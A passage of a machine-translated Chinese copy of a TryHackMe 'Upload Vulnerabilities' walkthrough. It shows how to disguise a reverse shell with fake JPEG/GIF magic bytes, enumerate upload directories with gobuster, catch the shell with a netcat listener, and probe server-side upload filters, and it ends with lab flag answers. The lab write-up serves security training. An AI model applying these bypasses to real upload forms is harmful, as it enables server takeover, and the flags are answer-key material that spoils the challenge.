kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">将它改为我们之前为JPEG文件找到的幻数:<code class="fe oo op oq mu b">FF D8 FF DB</code></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi qd"><img src="../Images/1aba824eca378ae9a71672bf5c24afae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*Ba6H9UiaBP-7Z1xT"/></div></div></figure><p id="2e4b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在，如果我们保存并退出文件(Ctrl + x)，我们可以再次使用file，并看到我们已经成功地欺骗了我们的shell的文件类型:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qe"><img src="../Images/77c17f4817e69cfdcf0d11bd8d53b058.png" data-original-src="https://miro.medium.com/v2/resize:fit:754/0*VYtQxbfjYXd7_4CT"/></div></figure><p id="c1ec" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">完美。现在让我们尝试上传修改后的外壳，看看它是否绕过了过滤器！</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi qf"><img src="../Images/2891182001099ae4786716e4a9cee36d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*AgiYwNijV0VA4gjJ"/></div></div></figure><p id="96ef" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在我们已经做到了——我们绕过了服务器端的幻数过滤器，收到了一个反向shell。</p><p id="f25c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">前往<code class="fe oo op oq mu b">magic.uploadvulns.thm</code> -是最后一次迷你挑战的时候了。</p><p id="d50e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这将是你在任务十一的挑战之前必须黑掉的最后一个示例网站；因此，我们再次提高了基本安全的水平。上一个任务中的网站实现了一个更改的命名方案，将上传的日期和时间添加到文件名中。这项任务不会这样做，以保持它相对容易；但是，目录索引已关闭，因此您将无法导航到包含上传内容的目录。相反，您需要使用shell的URI直接访问它。</p><p id="ef39" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">绕过幻数过滤器上传一个外壳。找到上传的外壳的位置并激活它。您的旗帜在<code class="fe oo op oq mu b">/var/www/</code>中。</p><p id="d0b6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">请只发gif！</p><p id="b5d6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi">47 49 46 38 37 61</p><p id="7d90" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">GIF89a</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="1f01" class="my lx iq mu b gy mz na l nb nc">gobuster dir -u <a class="ae kr" href="http://magic.uploadvulns.thm/" rel="noopener ugc nofollow" target="_blank">http://magic.uploadvulns.thm/</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></pre><p id="318d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">/图形(状态:301)<br/>/资产(状态:301)</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="ee7a" class="my lx iq mu b gy mz na l nb nc">nc -lnvp 9001</span></pre><p id="d5b2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">从/var/www/</p><blockquote class="og oh oi"><p id="35dd" class="ks kt lo ku b kv kw jr kx ky kz ju la oj lc ld le ok lg lh li ol lk ll lm ln ij bi translated"><strong class="ku ir">答案:THM { mwy 5 zgu 4 nze 0 zdlhnje 1 ngm 4 zthjzdjh }</strong></p></blockquote><h1 id="ac15" class="lw lx iq bd ly lz ni mb mc md nj mf mg jw nk jx mi jz nl ka mk kc nm kd mm mn bi translated">任务10示例方法</h1><p id="c312" class="pw-post-body-paragraph ks kt iq ku b kv mo jr kx ky mp ju la lb mq ld le lf mr lh li lj ms ll lm ln ij bi translated">我们现在已经看到了各种不同类型的过滤器—客户端和服务器端—以及文件上传攻击的一般方法。在下一个任务中，您将需要完成一个黑盒文件上传挑战，因此，让我们借此机会更深入地讨论一个解决此类挑战的示例方法。您可以开发自己的替代方法，但是，如果您是这种攻击的新手，您可能会发现下面的信息很有用。</p><p id="afd4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们将把这看作一个逐步的过程。假设我们得到了一个要进行安全审计的网站。</p><ol class=""><li id="b452" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln of nt nu nv bi translated">我们要做的第一件事是把网站作为一个整体来看。使用浏览器扩展，比如前面提到的Wappalyzer(或者手动)，我们将寻找web应用程序可能是用什么语言和框架构建的。请注意，Wappalyzer并不总是100%准确。手动枚举的良好开端是向网站发出请求，然后用Burpsuite拦截响应。像<code class="fe oo op oq mu b">server</code>或<code class="fe oo op oq mu b">x-powered-by</code>这样的头可以用来获得关于服务器的信息。我们还会寻找攻击的媒介，比如上传页面。</li><li id="3c12" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln of nt nu nv bi translated">找到一个上传页面后，我们将进一步检查它。查看客户端脚本的源代码，以确定是否有任何客户端过滤器要绕过，这将是一个好的开始，因为这完全在我们的控制之下。</li><li id="8f6e" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln of nt nu nv bi translated">然后我们会尝试一个完全无害的文件上传。从这里我们可以看到我们的文件是如何被访问的。换句话说，我们能在上传文件夹中直接访问它吗？是不是嵌在某页某处？网站的命名方案是什么？如果位置不明显，这就是Gobuster等工具的用武之地。这一步非常重要，因为它不仅提高了我们对所攻击的虚拟环境的了解，还为我们提供了一个基线“已接受”文件，我们可以在此基础上进行进一步的测试。</li></ol><ul class=""><li id="4fb0" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln ns nt nu nv bi translated">这里一个重要的Gobuster开关是-x开关，它可以用来查找具有特定扩展名的文件。例如，如果您将<code class="fe oo op oq mu b">-x php,txt,html</code>添加到Gobuster命令中，该工具会将<code class="fe oo op oq mu b">.php</code>、<code class="fe oo op oq mu b">.txt</code>和<code class="fe oo op oq mu b">.html</code>添加到所选单词列表中的每个单词，一次添加一个。如果你上传了一个有效载荷，而服务器改变了上传文件的名称，这将非常有用。</li></ul><ol class=""><li id="3d62" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln of nt nu nv bi translated">确定了我们上传的文件可以被访问的方式和位置后，我们将尝试恶意的文件上传，绕过我们在第二步中发现的任何客户端过滤器。我们希望我们的上传被服务器端的过滤器停止，但是它给出的错误信息对我们决定下一步非常有用。</li></ol><p id="1981" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">假设我们的恶意文件上传已经被服务器阻止，这里有一些方法来确定哪种服务器端过滤器可能已经就位:</p><ol class=""><li id="bbf0" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln of nt nu nv bi translated">如果你能成功上传一个文件扩展名完全无效的文件(例如<strong class="ku ir">testing image . invalidfileextension</strong>)，那么很有可能服务器正在使用扩展名黑名单过滤掉可执行文件。如果上传失败，那么任何扩展过滤器都将在白名单上运行。</li><li id="d149" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln of nt nu nv bi translated">尝试重新上传您最初接受的无害文件，但这一次将文件的幻数改为您希望被过滤的值。如果上传失败，那么你知道服务器正在使用一个基于幻数的过滤器。</li><li id="52af" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln of nt nu nv bi translated">与前一点一样，尝试上传您的无害文件，但是使用Burpsuite拦截请求，并将上传的MIME类型更改为您希望过滤的类型。如果上传失败，那么您知道服务器正在基于MIME类型进行过滤。</li><li id="5e80" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln of nt nu nv bi translated">枚举文件长度过滤器就是上传一个小文件，然后上传越来越大的文件，直到你达到过滤器。到那时，你就会知道什么是可接受的极限。如果你非常幸运，那么原始上传的错误信息可能会直接告诉你大小限制是多少。请注意，一个小的文件长度限制可能会阻止您上传我们到目前为止一直在使用的反向shell。</li></ol><p id="2108" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">你现在应该已经准备好接受任务11的挑战了</p><h1 id="86fb" class="lw lx iq bd ly lz ni mb mc md nj mf mg jw nk jx mi jz nl ka mk kc nm kd mm mn bi translated">任务11挑战</h1><p id="2f73" class="pw-post-body-paragraph ks kt iq ku b kv mo jr kx ky mp ju la lb mq ld le lf mr lh li lj ms ll lm ln ij bi translated">挑战时间到了！</p><p id="8fd8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">前往<strong class="ku ir"> jewel.uploadvulns.thm </strong>。</p><p id="38d0" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">把你在这个房间里学到的东西用在这台机器上得到一个外壳。像往常一样，你的旗帜在<code class="fe oo op oq mu b">/var/www/</code>里。请记住，这个挑战将是你到目前为止所学知识的积累，因此可能要绕过多个过滤器。附带的单词表可能会有帮助。还要记住，不是所有的网络服务器都有PHP后端...</p><p id="589a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果你需要帮助，这里有一系列提示<a class="ae kr" href="https://muirlandoracle.co.uk/2020/06/30/file-upload-vulnerabilities-hints/" rel="noopener ugc nofollow" target="_blank"/>。</p><p id="8cca" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">此外，此处有本次挑战<a class="ae kr" href="https://youtu.be/8UPXibv_s1A" rel="noopener ugc nofollow" target="_blank">的完整视频演示。</a></p><p id="f625" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">黑掉机器，从/var/www/</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="b838" class="my lx iq mu b gy mz na l nb nc">gobuster dir -u <a class="ae kr" href="http://jewel.uploadvulns.thm/" rel="noopener ugc nofollow" target="_blank">http://jewel.uploadvulns.thm/</a> -w /usr/share/wordlists/dirb/big.txt  -t 250</span></pre><p id="0edb" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">隐藏目录</p><p id="7ae9" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">/内容(状态:301)<br/>/管理(状态:200)<br/>/管理(状态:200)<br/>/管理(状态:200)<br/>/资产(状态:301)<br/>/内容(状态:301)<br/>/模块(状态:301)</p><h2 id="d7d5" class="my lx iq bd ly ow ox dn mc oy oz dp mg lb pa pb mi lf pc pd mk lj pe pf mm pg bi translated">硬石膏</h2><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="cbc0" class="my lx iq mu b gy mz na l nb nc">HTTP/1.1 200 OK<br/>Server: nginx/1.17.6<br/>Date: Mon, 16 Nov 2020 22:27:20 GMT<br/>Content-Type: application/javascript; charset=UTF-8<br/>Content-Length: 1579<br/>Connection: close<br/>X-Powered-By: Express<br/>Access-Control-Allow-Origin: *<br/>Accept-Ranges: bytes<br/>Cache-Control: public, max-age=0<br/>Last-Modified: Fri, 03 Jul 2020 22:16:52 GMT<br/>ETag: W/"62b-17316c0f820"</span><span id="d4e0" class="my lx iq mu b gy qg na l nb nc">$(document).ready(function(){let errorTimeout;const fadeSpeed=1000;function setResponseMsg(responseTxt,colour){$("#responseMsg").text(responseTxt);if(!$("#responseMsg").is(":visible")){$("#responseMsg").css({"color":colour}).fadeIn(fadeSpeed)}else{$("#responseMsg").animate({color:colour},fadeSpeed)}clearTimeout(errorTimeout);errorTimeout=setTimeout(()=&gt;{$("#responseMsg").fadeOut(fadeSpeed)},5000)}$("#uploadBtn").click(function(){$("#fileSelect").click()});$("#fileSelect").change(function(){const fileBox=document.getElementById("fileSelect").files[0];const reader=new FileReader();reader.readAsDataURL(fileBox);reader.onload=function(event){</span><span id="3ae4" class="my lx iq mu b gy qg na l nb nc">const text={success:"File successfully uploaded",failure:"No file selected",invalid:"Invalid file type"};$.ajax("/",{data:JSON.stringify({name:fileBox.name,type:fileBox.type,file:event.target.result}),contentType:"application/json",type:"POST",success:function(data){let colour="";switch(data){case "success":colour="green";break;case "failure":case "invalid":colour="red";break}setResponseMsg(text[data],colour)}})}})});</span></pre><p id="7cfb" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir"> Gobuster </strong></p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="75e8" class="my lx iq mu b gy mz na l nb nc">gobuster dir -u <a class="ae kr" href="http://jewel.uploadvulns.thm/content" rel="noopener ugc nofollow" target="_blank">http://jewel.uploadvulns.thm/content</a> -w UploadVulnsWordlist.txt -t 250 -x jpg</span></pre><p id="736a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">/ABH.jpg(状态:200) <br/> /LKQ.jpg(状态:200) <br/> /SAD.jpg(状态:200) <br/> /UAD.jpg(状态:200)</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="2c3a" class="my lx iq mu b gy mz na l nb nc">nc -lnvp 9001</span></pre><blockquote class="og oh oi"><p id="8ea0" class="ks kt lo ku b kv kw jr kx ky kz ju la oj lc ld le ok lg lh li ol lk ll lm ln ij bi translated"><strong class="ku ir">Flag:THM { nzrlytuwntizodmwmwzhmzbiy 2 jlzwu 2 }</strong></p></blockquote><p id="b35f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">你可以在:<br/><strong class="ku ir">LinkedIn:-</strong><a class="ae kr" href="https://www.linkedin.com/in/shamsher-khan-651a35162/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/shamsher-khan-651a35162/</a><br/><strong class="ku ir">Twitter:-</strong><a class="ae kr" href="https://twitter.com/shamsherkhannn" rel="noopener ugc nofollow" target="_blank">https://twitter.com/shamsherkhannn</a><br/><strong class="ku ir">Tryhackme:-</strong><a class="ae kr" href="https://tryhackme.com/p/Shamsher" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/Shamsher</a></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qh"><img src="../Images/09e5bbba06c7688a702aeec8570d243c.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*Vve7XR6kstH7qA5iQQ-kYA.png"/></div></figure><p id="f472" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如需更多演练，请在出发前继续关注… <br/></p><p id="b9f5" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">访问我的其他演练:-</p><p id="5cc5" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">感谢您花时间阅读我的演练。<br/>如果你觉得有用，请点击👏按钮👏(高达40倍)并分享<br/>它来帮助其他有类似兴趣的人！+随时欢迎反馈！</p></div></div>    
</body>
</html>